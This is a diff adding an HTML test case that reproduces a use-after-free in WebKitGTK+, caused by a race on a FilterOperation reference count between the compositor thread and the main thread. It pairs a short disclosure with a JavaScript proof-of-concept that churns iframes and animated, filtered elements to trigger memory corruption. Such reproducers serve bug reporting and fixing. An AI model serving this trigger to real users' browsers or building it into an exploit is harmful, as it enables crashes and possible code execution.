@@ -1,0 +1,51 @@
+<!--
+VULNERABILITY DETAILS
+The compositor thread in WebKitGTK+ might alter a FilterOperation object's reference count variable at the same time as the main thread. Then the reference count corruption might lead to a UAF condition.
+
+
+REPRODUCTION CASE
+-->
+
+<html>
+<style>
+@keyframes foo {
+    0% { opacity: 0; }
+    100% { opacity: 1; }
+}
+
+div {
+  animation-name: foo;
+  animation-duration: 1s;
+  animation-iteration-count: infinite;
+  filter: saturate(50%);
+}
+</style>
+<body>
+<script>
+    frame = document.createElement("iframe");
+
+    setInterval(_ => {
+      frame.remove();
+      document.body.appendChild(frame);
+
+      doc = frame.contentDocument;
+      doc.head.appendChild(document.querySelector("style").cloneNode(true));
+
+      elt = document.createElement("div");
+      elt.textContent = "foo";
+      let elements = [];
+
+      for (let i = 0, count = Math.random() * 50; i < count; ++i) {
+        elements[i] = doc.body.appendChild(elt.cloneNode(true));
+        elements[i].clientWidth;
+      }
+    }, Math.random() * 500);
+</script>
+</body>
+</html>
+
+<!--
+VERSION
+Reproduced on WebKitGTK+ build revision 240647.
+This bug doesn't seem to affect WebKit on macOS/iOS.
+-->
